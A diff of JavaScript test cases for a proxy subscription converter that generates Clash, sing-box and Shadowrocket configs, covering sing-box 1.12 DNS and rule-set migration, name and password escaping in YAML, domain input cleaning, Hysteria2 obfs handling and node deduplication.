+const OWNX = { x: { name: 'OwnXHTTP', type: 'vless', s: 'x.example.com', p: 443, u: UUID0, sni: 'www.bing.com', pk: PKX, sid: '01', net: 'xhttp', flow: '' } }
+
+sec('56. sing-box 1.12+ 结构校验（fixture 与各种构造输入）')
+{
+  // 校验器本身不能是摆设：旧格式的典型写法必须被它逮住
+  const legacy = JSON.stringify({ dns: { servers: [{ tag: 'r', address: 'https://1.1.1.1/dns-query', detour: 'd' }], rules: [{ outbound: 'any', server: 'r' }], fakeip: { enabled: true } },
+    inbounds: [{ type: 'mixed', tag: 'in', sniff: true }], outbounds: [{ type: 'direct', tag: 'd' }, { type: 'vless', tag: 'v', server: 'a', server_port: 1, uuid: 'u', transport: { type: 'tcp' } }],
+    route: { rules: [{ geoip: ['cn'], outbound: 'd' }] } })
+  const le = sbCheck(legacy)
+  ok(['geoip', 'sniff', 'address', 'outbound', 'fakeip', 'transport.type', 'default_domain_resolver', 'detour'].every(k => le.some(e => e.includes(k))),
+    `校验器能识别旧格式的各类问题（${le.length} 条）`)
+
+  sbOk('fixture 默认输出', T.genSB(up, P, LIB, OWN, SET))
+  sbOk('没有任何节点', T.genSB([], P, LIB, {}, SET))
+  sbOk('只有自有节点', T.genSB([], P, LIB, OWN, SET))
+  sbOk('没有自有节点', T.genSB(up, P, LIB, {}, SET))
+  sbOk('自有节点含 xhttp', T.genSB(up, P, LIB, { ...OWNX, ...OWN }, SET))
+  sbOk('只有一个 xhttp 自有节点', T.genSB([], P, LIB, OWNX, SET))
+  sbOk('关掉 fake-ip 与 DNS 走代理', T.genSB(up, P, LIB, OWN, { ...SET, dns: { ...T.DEFAULT_DNS, fakeIp: false, remoteViaProxy: false } }))
+  sbOk('自定义 DNS（tls / quic / IPv6 / 带端口路径）', T.genSB(up, P, LIB, OWN, { ...SET, dns: { ...T.DEFAULT_DNS,
+    remote: ['tls://dns.google', 'https://dns.example.com:8443/q'], domestic: ['quic://dns.alidns.com'], bootstrap: ['2400:3200::1'] } }))
+  const land = up.find(n => n.kv.type === 'vless' && n.kv.network === 'ws')
+  sbOk('链式代理', T.genSB(up, P, LIB, OWN, SET, [{ id: 'c1', name: '🔗 链', via: 'own:usV2', out: land.key, enabled: true }], up))
+  sbOk('全部策略停用', T.genSB(up, P.map(p => ({ ...p, enabled: false })), LIB, OWN, SET))
+  sbOk('策略指向拒绝', T.genSB(up, [{ id: 'r', name: '拦截', target: 'reject', strict: true, enabled: true, presets: [], domains: ['ad.example.com'], keywords: [], processes: [] }], LIB, OWN, SET))
+}
+
+sec('57. sing-box：自有节点的 tcp / xhttp')
+{
+  const sb = JSON.parse(T.genSB([], P, LIB, { ...OWNX, ...OWN }, SET))
+  const a = sb.outbounds.find(o => o.tag === OWN.usV2.name)
+  ok(a && !('transport' in a), 'tcp Reality 节点不写 transport（sing-box 没有叫 tcp 的传输）')
+  ok(a && a.flow === 'xtls-rprx-vision' && a.tls.reality.enabled && a.tls.utls.enabled, 'Reality、uTLS、vision 流控照旧')
+  ok(!sb.outbounds.some(o => o.tag === 'OwnXHTTP'), 'xhttp 自有节点在 sing-box 里剔除')
+  ok(!sb.outbounds.some(o => (o.outbounds || []).includes('OwnXHTTP')), '剔除后没有任何分组引用它')
+  ok(!JSON.stringify(sb).includes('"xhttp"'), '整份配置里不再出现 xhttp 传输')
+  // strict 策略的目标全被剔除：按约定回落到节点选择（不改成 REJECT）
+  const pol = [{ id: 'ai', name: 'AI', target: 'own:x', strict: true, enabled: true, presets: ['ai'], domains: [], keywords: [], processes: [] }]
+  const s2 = JSON.parse(T.genSB(up, pol, LIB, { ...OWNX, ...OWN }, SET))
+  const g = s2.outbounds.find(o => o.tag === 'AI')
+  ok(g && JSON.stringify(g.outbounds) === '["🚀 节点选择"]', 'strict 目标被剔除时回落到「🚀 节点选择」')
+  // DNS 出口取第一个「转得出来」的自有节点；xhttp 排第一时不能指向它
+  const dr = s2.dns.servers.find(s => s.tag === 'dns-remote')
+  ok(dr && dr.detour === OWN.usV2.name, `DNS 出口跳过被剔除的节点（${dr && dr.detour}）`)
+  const s3 = JSON.parse(T.genSB([], P, LIB, OWNX, SET))
+  ok(s3.dns.servers.find(s => s.tag === 'dns-remote').detour === '🚀 节点选择', '自有节点全被剔除时 DNS 出口回落到节点选择')
+  // Clash 支持 xhttp，照常下发
+  const cy = yaml.load(T.genClash(false, [], pol, LIB, { ...OWNX, ...OWN }, SET))
+  ok(cy.proxies.some(p => p.name === 'OwnXHTTP' && p.network === 'xhttp'), 'Clash 里 xhttp 节点照常保留')
+}
+
+sec('58. sing-box：DNS 迁到 1.12 新格式')
+{
+  const byTag = sb => Object.fromEntries(sb.dns.servers.map(s => [s.tag, s]))
+  const sb = JSON.parse(T.genSB(up, P, LIB, OWN, SET))
+  const t = byTag(sb)
+  ok(sb.dns.servers.every(s => s.type && !('address' in s) && !('address_resolver' in s) && !('strategy' in s)), '每个 server 都是 type + server 的新格式，没有旧字段')
+  ok(t['dns-remote'].type === 'https' && t['dns-remote'].server === 'dns.cloudflare.com' && t['dns-remote'].domain_resolver === 'dns-resolver', '境外 DoH 是域名，用 domain_resolver 指定引导 DNS 解析它')
+  ok(t['dns-direct'].type === 'https' && t['dns-direct'].server === '223.5.5.5' && !t['dns-direct'].domain_resolver, '国内 DoH 是 IP，不需要 domain_resolver')
+  ok(t['dns-resolver'].type === 'udp' && t['dns-resolver'].server === '223.5.5.5', '引导 DNS 是纯 IP 的 udp')
+  ok(!sb.dns.servers.some(s => s.detour === 'direct-out'), '直连的 DNS 不写 detour: direct-out（新格式下报 detour to an empty direct outbound）')
+  ok(t['dns-fake'] && t['dns-fake'].type === 'fakeip' && t['dns-fake'].inet4_range && t['dns-fake'].inet6_range, 'fakeip 是独立的 server')
+  ok(!('fakeip' in sb.dns) && !('independent_cache' in sb.dns), '没有 dns.fakeip 与 independent_cache')
+  ok(!sb.dns.rules.some(r => 'outbound' in r), 'DNS 规则里没有 outbound（1.14 移除）')
+  ok(sb.route.default_domain_resolver === 'dns-resolver', 'route.default_domain_resolver 接替原来的 outbound: any 规则')
+  ok(sb.dns.rules.some(r => (r.query_type || []).includes('A') && r.server === 'dns-fake'), 'A / AAAA 查询走 fakeip')
+  // DNS 走代理这件事的语义保留：开关控制 dns-remote 的 detour
+  const off = byTag(JSON.parse(T.genSB(up, P, LIB, OWN, { ...SET, dns: { ...T.DEFAULT_DNS, remoteViaProxy: false } })))
+  ok(!('detour' in off['dns-remote']), '关掉「境外 DNS 走代理」后 dns-remote 直连（不写 detour）')
+  ok(t['dns-remote'].detour === OWN.usV2.name, '开着时经代理出口查询')
+  // 审查第 28 条：关掉 fake-ip 时不能再引用 fakeip server
+  const nf = JSON.parse(T.genSB(up, P, LIB, OWN, { ...SET, dns: { ...T.DEFAULT_DNS, fakeIp: false } }))
+  ok(!nf.dns.servers.some(s => s.type === 'fakeip') && !nf.dns.rules.some(r => r.server === 'dns-fake'), '关掉 fake-ip：既不定义也不引用 fakeip server')
+  // 各种地址写法
+  const S = T.sbDnsServer
+  ok(JSON.stringify(S('a', 'https://dns.example.com:8443/custom', 'r')) === '{"tag":"a","type":"https","server":"dns.example.com","server_port":8443,"path":"/custom","domain_resolver":"r"}', 'DoH 的端口与路径')
+  ok(JSON.stringify(S('a', 'tls://1.1.1.1', 'r')) === '{"tag":"a","type":"tls","server":"1.1.1.1"}', 'DoT 且是 IP')
+  ok(S('a', 'quic://dns.adguard-dns.com', 'r').type === 'quic', 'DoQ')
+  ok(S('a', '2400:3200::1', 'r').type === 'udp' && S('a', '2400:3200::1', 'r').server === '2400:3200::1' && !S('a', '2400:3200::1', 'r').domain_resolver, 'IPv6 纯地址')
+  ok(!S('a', 'https://dns.google/dns-query#h3=true', 'r').path, '默认路径 /dns-query 不写，mihomo 风格的 # 参数丢弃')
+}
+
+sec('59. sing-box：入站、嗅探与规则集')
+{
+  const sb = JSON.parse(T.genSB(up, P, LIB, OWN, SET))
+  const tun = sb.inbounds.find(i => i.type === 'tun'), mixed = sb.inbounds.find(i => i.type === 'mixed')
+  ok(tun && JSON.stringify(tun.address) === '["172.19.0.1/30","fdfe:dcba:9876::1/126"]' && tun.auto_route && tun.strict_route && tun.stack === 'mixed',
+    '有 tun 入站，官方图形客户端才能接管设备流量')
+  ok(mixed && mixed.listen === '127.0.0.1' && mixed.listen_port === 2080, '保留 127.0.0.1:2080 的 mixed')
+  ok(sb.inbounds.every(i => !('sniff' in i)), '入站上不再有 sniff（1.13.4 起报错）')
+  ok(sb.route.rules[0].action === 'sniff' && sb.route.rules[1].protocol === 'dns' && sb.route.rules[1].action === 'hijack-dns', '嗅探与 DNS 劫持改成最前面的规则动作')
+  ok(sb.route.auto_detect_interface === true, 'auto_detect_interface 仍开着（tun 防回环）')
+  ok(!JSON.stringify(sb).includes('"geoip"') && !JSON.stringify(sb).includes('"geosite"'), '不再有 geoip / geosite 字段（1.12 已移除）')
+  const rs = Object.fromEntries((sb.route.rule_set || []).map(x => [x.tag, x]))
+  ok(rs['geosite-cn'] && rs['geosite-cn'].url === 'https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-cn.srs' && rs['geosite-cn'].format === 'binary' && rs['geosite-cn'].type === 'remote', 'geosite-cn 用官方远程规则集')
+  ok(rs['geoip-cn'] && rs['geoip-cn'].url === 'https://raw.githubusercontent.com/SagerNet/sing-geoip/rule-set/geoip-cn.srs', 'geoip-cn 用官方远程规则集')
+  ok(Object.values(rs).every(x => x.download_detour === '🚀 节点选择'), '规则集经代理组下载')
+  const last = sb.route.rules[sb.route.rules.length - 1]
+  ok(last.outbound === 'direct-out' && JSON.stringify(last.rule_set) === '["geosite-cn","geoip-cn"]', '国内域名与 IP 直连，排在所有策略之后')
+  ok(sb.experimental && sb.experimental.cache_file && sb.experimental.cache_file.enabled === true, '开了 cache_file，规则集不用每次启动重下')
+  const priv = sb.route.rules.findIndex(r => r.ip_is_private), firstPol = sb.route.rules.findIndex(r => (r.domain_suffix || []).includes('youtube.com'))
+  ok(priv > 1 && priv < firstPol && sb.route.rules[priv].outbound === 'direct-out', 'tun 接管后本机与局域网地址直连')
+}
+
+sec('60. Hysteria2：混淆密码为空时不输出混淆')
+{
+  const own = { h: { name: 'HY', type: 'hysteria2', s: 'hy.example.com', p: 8443, u: 'pwd', sni: 'hy.example.com', obfs: 'salamander', opwd: '' } }
+  const cy = T.genClash(false, [], P, LIB, own, SET)
+  const hy = yaml.load(cy).proxies.find(p => p.name === 'HY')
+  ok(hy && !('obfs' in hy) && !('obfs-password' in hy), 'Clash：自有节点不写 obfs（以前是 salamander + 空密码，mihomo 报 missing obfs password）')
+  const sb = JSON.parse(T.genSB([], P, LIB, own, SET)).outbounds.find(o => o.tag === 'HY')
+  ok(sb && !sb.obfs, 'sing-box 同样不写')
+  ok(!/obfs/.test(T.genSR(false, [], P, LIB, own, SET).split('\n').find(l => l.startsWith('HY =')) || 'obfs'), 'Shadowrocket 同样不写')
+  ok(!/obfs/.test(T.shareLink({ name: 'HY', own: true, o: own.h })), '分享链接同样不带')
+  const full = { h: { ...own.h, opwd: 'op' } }
+  ok(yaml.load(T.genClash(false, [], P, LIB, full, SET)).proxies.find(p => p.name === 'HY')['obfs-password'] === 'op', '类型和密码都有时照常输出')
+  // 机场 YAML 透传：有类型没密码
+  const n = T.splitFeed('proxies:\n  - { name: HY2, type: hysteria2, server: h.example.com, port: 443, password: p, obfs: salamander, obfs-password: "" }').nodes
+  const upH = namedOf(n.map(p => ({ up: 'a', upName: 'A', raw: p._name, kv: p, region: 'other' })))
+  const h2 = yaml.load(T.genClash(false, upH, P, LIB, {}, SET)).proxies[0]
+  ok(h2 && !('obfs' in h2), 'Clash：机场节点缺混淆密码时同样丢掉 obfs')
+  ok(!T.toSB(upH[0]).obfs, 'sing-box：机场节点同理')
+  ok(!('obfs' in T.parseShareLine('hysteria2://p@h.example.com:443/?obfs=salamander#x')), '分享链接只有 obfs 没有密码时不记混淆')
+  // 保存接口：空就是不混淆，不再兜底成 salamander
+  const savedP = KV['policies'], savedN = KV['nodes']
+  KV['policies'] = JSON.stringify([{ id: 'x', name: 'X', target: 'all', strict: false, enabled: true, presets: [], domains: ['x.example.com'], keywords: [], processes: [] }])
+  const r = await apiCall('/api/own', { own: { h: { name: 'HY', type: 'hysteria2', s: 'hy.example.com', p: 8443, u: 'pwd', sni: 's', obfs: '', opwd: '' } } })
+  ok(r.body.ok && r.body.own.h.obfs === '', '/api/own：obfs 为空就存空，不兜底成 salamander')
+  if (savedP === undefined) delete KV['policies']; else KV['policies'] = savedP
+  if (savedN === undefined) delete KV['nodes']; else KV['nodes'] = savedN
+}
+
+sec('61. Clash：名字与策略名的转义')
+{
+  const bad = ['日本 "引号" 01', '香港\\反斜杠 #1', '美国: 洛杉矶']
+  const up6 = namedOf(feedOf(bad.map((nm, i) => `trojan://pwd@n${i}.example.com:443?sni=s.example.com#` + encodeURIComponent(nm)), 'a', '机场 "A": #1'))
+  const ov = {}; ov[up6[0].key] = { name: '覆盖名 "x" #y: z' }
+  const up7 = namedOf(up6.map(n => ({ up: n.up, upName: n.upName, raw: n.raw, kv: n.kv, region: n.region })), ov)
+  const own = { o1: { ...OWN.usV2, name: '自建 "A" #1: x' }, o2: { ...OWN.usH, name: '自建\\B' } }
+  const pol = [
+    { id: 'p1', name: 'AI, 美国', target: 'own:o1', strict: true, enabled: true, presets: [], domains: ['ai.example.com'], keywords: ['open,ai', 'claude'], processes: ['Chrome: helper', 'Safari'] },
+    { id: 'p2', name: 'Media #1', target: 'all', strict: false, enabled: true, presets: [], domains: ['m.example.com'], keywords: [], processes: [] },
+    { id: 'p3', name: '名字: 冒号', target: 'region:jp', strict: false, enabled: true, presets: [], domains: ['n.example.com'], keywords: [], processes: [] },
+  ]
+  const chains = [{ id: 'c1', name: '链 "式" #1', via: 'own:o1', out: up7[1].key, enabled: true }]
+  const cy = T.genClash(false, up7, pol, LIB, own, SET, chains, up7)
+  let d = null
+  try { d = yaml.load(cy) } catch (e) { ok(false, 'YAML 解析失败：' + e.message) }
+  if (d) {
+    const names = d.proxies.map(p => p.name)
+    ok(names.includes('覆盖名 "x" #y: z') && names.includes('自建 "A" #1: x') && names.includes('自建\\B') && names.includes('链 "式" #1'),
+      '覆盖名 / 自建名 / 链式名里的 " \\ # 「: 」原样还原')
+    ok(up7.every(n => names.includes(n.name)), '机场名里的特殊字符同样原样还原：' + up7.map(n => n.name).join(' | '))
+    ok(clashRefs(d).length === 0, '无悬空引用、无重名、无空组' + (clashRefs(d).length ? '：' + clashRefs(d).slice(0, 3) : ''))
+    ok(d.proxies.find(p => p.name === '链 "式" #1')['dialer-proxy'] === '自建 "A" #1: x', 'dialer-proxy 同样转义')
+    const gn = d['proxy-groups'].map(g => g.name)
+    ok(gn.includes('AI， 美国') && !gn.includes('AI, 美国'), '老数据里策略名的英文逗号换成全角（组名）')
+    ok(d.rules.includes('DOMAIN-SUFFIX,ai.example.com,AI， 美国'), '规则目标用同一个转换，引用对得上')
+    ok(gn.includes('Media ＃1') && d.rules.includes('DOMAIN-SUFFIX,m.example.com,Media ＃1'), '「 #」不会在规则行里被当成注释截断')
+    ok(gn.includes('名字： 冒号') && d.rules.includes('DOMAIN-SUFFIX,n.example.com,名字： 冒号'), '「: 」不会把规则行变成映射')
+    ok(!d.rules.some(r => r.startsWith('DOMAIN-KEYWORD,open')) && d.rules.includes('DOMAIN-KEYWORD,claude,AI， 美国'), '带逗号的关键词被丢弃，其余照常')
+    ok(!d.rules.some(r => r.includes('Chrome')) && d.rules.includes('PROCESS-NAME,Safari,AI， 美国'), '会破坏规则行的进程名被丢弃')
+  }
+  // 行格式约束：规则测试按行读 name 行与 proxies 行
+  ok(cy.split('\n').filter(l => /^ {2}- name: /.test(l)).every(l => { try { return typeof JSON.parse(l.slice(10)) === 'string' } catch (e) { return false } }), 'name 行都是 JSON 字符串')
+  ok(cy.split('\n').filter(l => /^ {4}proxies: /.test(l)).every(l => /^ {4}proxies: \[.*\]$/.test(l) && Array.isArray(JSON.parse(l.slice(13)))), 'proxies 行都是 JSON 数组写法')
+  ok(cy.split('\nrules:\n')[1].split('\n').every(l => /^ {2}- [A-Z-]+,/.test(l)), '规则行保持不加引号的 TYPE,VALUE,TARGET 写法')
+  // 规则测试（/api/match 用的解析）照样能走通
+  const m = T.matchRules(cy, 'x.ai.example.com')
+  ok(m.target === 'AI， 美国' && JSON.stringify(T.groupMembers(cy, m.target)) === JSON.stringify(['自建 "A" #1: x']), '规则测试能定位到策略组并列出成员')
+  ok(JSON.stringify(T.groupMembers(cy, '🚀 节点选择')).includes('覆盖名 \\"x\\" #y: z'), 'groupMembers 读得回转义过的名字')
+  // 保存时就拦住英文逗号
+  const saved = KV['policies']
+  const r = await apiCall('/api/policies', { policies: [{ id: 'a', name: 'AI, 美国', target: 'all', presets: [], domains: ['a.example.com'] }] })
+  ok(r.status === 400 && /英文逗号/.test(r.body.msg) && /中文逗号/.test(r.body.msg), '保存含英文逗号的策略名被拒，提示改成中文逗号')
+  const r2 = await apiCall('/api/policies', { policies: [{ id: 'a', name: 'AI，美国', target: 'all', presets: [], domains: ['a.example.com'] }] })
+  ok(r2.body.ok, '中文逗号可以保存')
+  if (saved === undefined) delete KV['policies']; else KV['policies'] = saved
+  ok(T.ruleName('  a,b: c #d  ') === 'a，b： c ＃d' && T.ruleName('') === '未命名', 'ruleName 的各项替换')
+}
+
+sec('62. 策略的额外域名：拆分与清洗')
+{
+  const doms = T.policyDomains({ presets: [], domains: ['a.example.com, b.example.com', '*.c.example.com', '+.d.example.com', 'https://e.example.com:8443/x?y#z', '.f.example.com', 'not a domain!!', 'g.example.com，h.example.com', 'I.Example.COM.'] }, LIB)
+  ok(JSON.stringify(doms) === JSON.stringify(['a.example.com', 'b.example.com', 'c.example.com', 'd.example.com', 'e.example.com', 'f.example.com', 'g.example.com', 'h.example.com', 'i.example.com']),
+    '一行多个被拆开，整句废话被丢掉：' + doms.join(' '))
+  ok(JSON.stringify(T.policyDomains({ presets: [], domains: ['cn', 'Lan'] }, LIB)) === '["cn","lan"]', '单独填的顶级域照常保留')
+  ok(['c.example.com', 'd.example.com', 'e.example.com', 'f.example.com', 'i.example.com'].every(d => doms.includes(d)), '*. / +. / . 前缀、协议头、端口、路径、末尾点都被剥掉')
+  ok(!doms.some(d => /[\s,*!:/]/.test(d)), '不像域名的项被丢弃，不会生成非法规则')
+  ok(T.cleanDomain('例子.中国') === 'xn--fsqu00a.xn--fiqs8s', '中文域名转成 punycode')
+  const cy = T.genClash(false, [], [{ id: 'd', name: '域名', target: 'all', strict: false, enabled: true, presets: [], domains: ['a.example.com, b.example.com', '*.c.example.com'], keywords: [], processes: [] }], LIB, OWN, SET)
+  const d = yaml.load(cy)
+  ok(d.rules.includes('DOMAIN-SUFFIX,a.example.com,域名') && d.rules.includes('DOMAIN-SUFFIX,b.example.com,域名') && d.rules.includes('DOMAIN-SUFFIX,c.example.com,域名'), '生成的规则是能匹配上的那种')
+  ok(!cy.includes('*.c.example.com') && !cy.includes('a.example.com, b'), '规则里没有通配符和整行拼接')
+  // 域名库里的脏数据同样在生成时洗掉（/api/lib 不校验）
+  const dirty = T.policyDomains({ presets: ['x'], domains: [] }, { x: { domains: ['*.lib.example.com', 'k.example.com l.example.com'] } })
+  ok(JSON.stringify(dirty) === '["lib.example.com","k.example.com","l.example.com"]', '域名库里的通配符与多值同样被洗干净')
+  const saved = KV['policies']
+  const r = await apiCall('/api/policies', { policies: [{ id: 'a', name: 'A', target: 'all', presets: [], domains: ['x.example.com, *.y.example.com', 'https://z.example.com/p', '??'] }] })
+  ok(r.body.ok && JSON.stringify(r.body.policies[0].domains) === '["x.example.com","y.example.com","z.example.com"]', '保存时同样拆分清洗：' + JSON.stringify(r.body.policies && r.body.policies[0].domains))
+  if (saved === undefined) delete KV['policies']; else KV['policies'] = saved
+}
+
+sec('63. 字段值一律加引号')
+{
+  const pw = ['*Abc', '&abc', '#Abc', '00123', 'true', 'null', '1e5', 'a: b', 'x #y', "q'uote", 'd"q', 'back\\slash', '!tag', '%pct', '@at', '`bt', '|pipe', '>gt', '- dash', '0x1F', '1_000', '~']
+  const nodes = namedOf(feedOf(pw.map((p, i) => `trojan://${encodeURIComponent(p)}@t${i}.example.com:443?sni=s.example.com#T${i}`)))
+  ok(nodes.length === pw.length, `全部解析出来（${nodes.length}/${pw.length}）`)
+  const d = yaml.load(T.genClash(false, nodes, P, LIB, {}, SET))
+  const got = nodes.map(n => d.proxies.find(p => p.name === n.name).password)
+  const wrong = pw.filter((p, i) => got[i] !== p)
+  ok(wrong.length === 0, 'YAML 读回的密码与原文逐字一致、且都是字符串' + (wrong.length ? '：' + wrong.join(' ') : ''))
+  const re = namedOf(feedOf([`vless://${UUID0}@r.example.com:443?security=reality&pbk=${PKX}&sid=0888&fp=chrome&sni=www.bing.com&type=tcp#R`]))
+  const rd = yaml.load(T.genClash(false, re, P, LIB, {}, SET)).proxies[0]
+  ok(rd['reality-opts']['short-id'] === '0888', `short-id 0888 仍是字符串（以前被读成数字，mihomo 报 invalid REALITY short ID）`)
+  // 自有节点的字符串值
+  const own = { v: { name: 'OwnV', type: 'vless', s: 'o.example.com', p: 443, u: UUID0, sni: 'www.bing.com', pk: PKX, sid: '0888', net: 'tcp', flow: 'xtls-rprx-vision' },
+                w: { name: 'OwnWS', type: 'vless', s: 'w.example.com', p: 443, u: UUID0, sni: '#sni.example.com', net: 'ws', path: '/a #b', host: '*host.example.com' },
+                h: { name: 'OwnH', type: 'hysteria2', s: 'h.example.com', p: 443, u: '*Abc', sni: 'h.example.com', obfs: 'salamander', opwd: '#0888' } }
+  const od = yaml.load(T.genClash(false, [], P, LIB, own, SET))
+  const by = Object.fromEntries(od.proxies.map(p => [p.name, p]))
+  ok(by.OwnV['reality-opts']['short-id'] === '0888' && by.OwnV.uuid === UUID0, '自有 Reality 的 short-id / uuid 为字符串')
+  ok(by.OwnWS.servername === '#sni.example.com' && by.OwnWS['ws-opts'].path === '/a #b' && by.OwnWS['ws-opts'].headers.Host === '*host.example.com', '自有 ws 的 servername / path / Host 原样')
+  ok(by.OwnH.password === '*Abc' && by.OwnH['obfs-password'] === '#0888', '自有 hy2 的密码与混淆密码原样')
+  // 下游 toSB / Shadowrocket / 分享链接都得能还原 JSON 转义过的引号与反斜杠
+  const dq = nodes[pw.indexOf('d"q')], bs = nodes[pw.indexOf('back\\slash')]
+  ok(T.toSB(dq).password === 'd"q' && T.toSB(bs).password === 'back\\slash', 'toSB 还原引号与反斜杠')
+  ok(T.parseShareLine(T.shareLink(dq)) && T.unquote(T.parseShareLine(T.shareLink(dq)).password) === 'd"q', '分享链接导出再导入，密码不变')
+  ok(T.genSR(false, [bs], [], LIB, {}, SET).includes('password=back\\slash'), 'Shadowrocket 拿到的是还原后的值')
+  ok(T.unquote('"a\\"b\\\\c"') === 'a"b\\c' && T.unquote("'it''s'") === "it's" && T.unquote('"\\x41"') === '\\x41', 'unquote 处理 JSON 转义、单引号转义，解不了的退回剥引号')
+  // 升级前存下的缓存 / 一次性链接快照里是没加引号的旧值，输出时同样兜住
+  const legacy = [{ up: 'a', upName: 'A', raw: 'L', region: 'other', kv: { name: 'L', type: 'trojan', server: 'l.example.com', port: '443', password: '*Abc', sni: '#s.example.com', udp: 'true' } },
+                  { up: 'a', upName: 'A', raw: 'R', region: 'other', kv: { name: 'R', type: 'vless', server: 'r.example.com', port: '443', uuid: UUID0, tls: 'true', 'reality-opts': `{ public-key: ${PKX}, short-id: 0888 }` } }]
+  const ld = yaml.load(T.genClash(false, namedOf(legacy), P, LIB, {}, SET)).proxies
+  ok(ld[0].password === '*Abc' && ld[0].sni === '#s.example.com' && ld[0].port === 443, '旧快照的顶层字符串字段补上引号，端口仍是数字')
+  ok(ld[1]['reality-opts']['short-id'] === '0888' && ld[1]['reality-opts']['public-key'] === PKX, '旧快照嵌套字段里的 short-id 同样补引号')
+  ok(T.kvOut('port', '443') === '443' && T.kvOut('ws-opts', '{ path: /x, max-early-data: 2048 }') === '{ path: /x, max-early-data: 2048 }', '安全的值、数字字段不被改动')
+}
+
+sec('64. 没有节点时不生成空的自动选择组')
+{
+  const d = yaml.load(T.genClash(false, [], P, LIB, {}, SET))
+  ok(!d['proxy-groups'].some(g => g.name === '♻️ 自动选择'), '一个节点都没有时不生成「♻️ 自动选择」（空 url-test 组 mihomo 报 use or proxies missing）')
+  ok(d['proxy-groups'].every(g => (g.proxies || []).length > 0), '剩下的组都不是空组')
+  ok(d['proxy-groups'].some(g => g.name === '🚀 节点选择'), '节点选择组仍在（至少有 DIRECT）')
+  ok(yaml.load(T.genClash(false, [], P, LIB, OWN, SET))['proxy-groups'].some(g => g.name === '♻️ 自动选择'), '有节点时照常生成')
+  const sb = JSON.parse(T.genSB([], P, LIB, {}, SET))
+  ok(sb.outbounds.filter(o => o.type === 'selector' || o.type === 'urltest').every(o => o.outbounds.length > 0), 'sing-box 同样没有空组')
+}
+
+sec('65. Reality 必须带 uTLS')
+{
+  const [n] = namedOf(feedOf([`vless://${UUID0}@r.example.com:443?security=reality&pbk=${PKX}&sid=01&sni=www.bing.com&type=tcp#NoFp`]))
+  const o = T.toSB(n)
+  ok(o && o.tls.reality.enabled && o.tls.utls && o.tls.utls.enabled && o.tls.utls.fingerprint === 'chrome', '缺 client-fingerprint 时补 chrome（否则 uTLS is required by reality client）')
+  const fp = f => T.toSB(namedOf(feedOf([`vless://${UUID0}@t.example.com:443?security=tls&sni=t.example.com&type=tcp&fp=${f}#F`]))[0]).tls.utls
+  ok(fp('firefox').fingerprint === 'firefox', '认得的指纹原样')
+  ok(fp('none') === undefined, 'mihomo 的 none = 不用 uTLS')
+  ok(fp('weird').fingerprint === 'chrome', 'sing-box 不认的指纹换成 chrome，不让整份配置失败')
+}
+
+sec('66. vless 流控归一')
+{
+  const mk = f => namedOf(feedOf([`vless://${UUID0}@r.example.com:443?security=reality&pbk=${PKX}&sid=01&fp=chrome&sni=www.bing.com&type=tcp&flow=${f}#F`]))[0]
+  ok(T.toSB(mk('xtls-rprx-vision-udp443')).flow === 'xtls-rprx-vision', 'xtls-rprx-vision-udp443 归一成 xtls-rprx-vision')
+  ok(T.toSB(mk('xtls-rprx-direct')) === null, '其它流控 sing-box 不认，节点剔除')
+  const n2 = { ...mk('xtls-rprx-direct'), region: 'jp' }
+  const sb = JSON.parse(T.genSB([n2], P, LIB, OWN, SET))
+  ok(!sb.outbounds.some(o => o.tag === n2.name) && sbCheck(JSON.stringify(sb)).length === 0, '剔除后没有悬空引用')
+  ok(yaml.load(T.genClash(false, [mk('xtls-rprx-vision-udp443')], P, LIB, {}, SET)).proxies[0].flow === 'xtls-rprx-vision-udp443', 'Clash 原样保留（mihomo 支持）')
+  ok(T.ownToSB({ ...OWN.usV2, flow: 'xtls-rprx-vision-udp443' }).flow === 'xtls-rprx-vision', '自有节点同样归一')
+}
+
+sec('67. 节点名全局去重')
+{
+  const nodes = feedOf(['日本 01', '日本 01', '香港 01'].map((nm, i) => `trojan://pwd@a${i}.example.com:443?sni=a.example.com#` + encodeURIComponent(nm)))
+  const auto = T.applyNaming(nodes, {})
+  ok(new Set(auto.map(n => n.name)).size === 3, '同一机场原名相同的两条，自动名不重复：' + auto.map(n => n.name).join(' | '))
+  const ov = T.applyNaming(nodes, { 'a::日本 01': { name: '同名' }, 'a::香港 01': { name: '同名' } })
+  ok(JSON.stringify(ov.map(n => n.name)) === '["同名","同名 2","同名 3"]', `覆盖名撞车时第二个起补序号（${ov.map(n => n.name).join(' | ')}）`)
+  const off = T.applyNaming(nodes, { 'a::日本 01': { name: '同名' }, 'a::香港 01': { name: '同名', off: true } })
+  ok(off[2].name === '同名' && off[1].name === '同名 2', '停用的节点不占名字')
+  const d = yaml.load(T.genClash(false, ov, P, LIB, OWN, SET))
+  ok(clashRefs(d).length === 0, 'Clash 无重名、无悬空')
+  ok(sbCheck(T.genSB(ov, P, LIB, OWN, SET)).length === 0, 'sing-box 无重复 tag')
+}
+
+sec('68. vmess 链接的 "tls":"none"')
+{
+  const vm = t => T.parseShareLine('vmess://' + B64(JSON.stringify({ v: '2', ps: 'V', add: 'v.example.com', port: '443', id: UUID0, aid: '0', net: 'ws', path: '/', tls: t })))
+  ok(!('tls' in vm('none')), '"tls":"none"（3x-ui 的写法）不开 TLS')
+  ok(!('tls' in vm('')), '空串不开')
+  ok(vm('tls').tls === 'true', '只有 "tls" 才开')
+}
+
+sec('69. Shadowrocket：转不出来的自建节点不被引用')
+{
+  const pol = [{ id: 'ai', name: 'AI', target: 'own:x', strict: true, enabled: true, presets: ['ai'], domains: [], keywords: [], processes: [] }]
+  const sr = T.genSR(false, up, pol, LIB, { ...OWNX, ...OWN }, SET)
+  const proxies = sr.split('[Proxy]\n')[1].split('\n[Proxy Group]')[0].split('\n').filter(Boolean).map(l => l.split(' = ')[0])
+  ok(!proxies.includes('OwnXHTTP'), 'xhttp 自建节点不在 [Proxy] 里')
+  const groups = sr.split('[Proxy Group]\n')[1].split('\n[Rule]')[0].split('\n').filter(Boolean)
+  const gnames = groups.map(l => l.split(' = ')[0])
+  const dang = []
+  for (const g of groups) for (const m of g.split(' = ')[1].split(',').slice(1).map(s => s.trim()).filter(s => !/=/.test(s)))
+    if (!proxies.includes(m) && !gnames.includes(m) && m !== 'DIRECT' && m !== 'REJECT') dang.push(m)
+  ok(dang.length === 0, '分组成员都存在' + (dang.length ? '：' + dang.slice(0, 3) : ''))
+  ok(groups.find(l => l.startsWith('AI =')) === 'AI = select, 🚀 节点选择', 'strict 目标转不出来时回落到节点选择（保持原有约定，不改成 REJECT）')
+  // Clash 同一约定：档案不含这个自有节点时回落
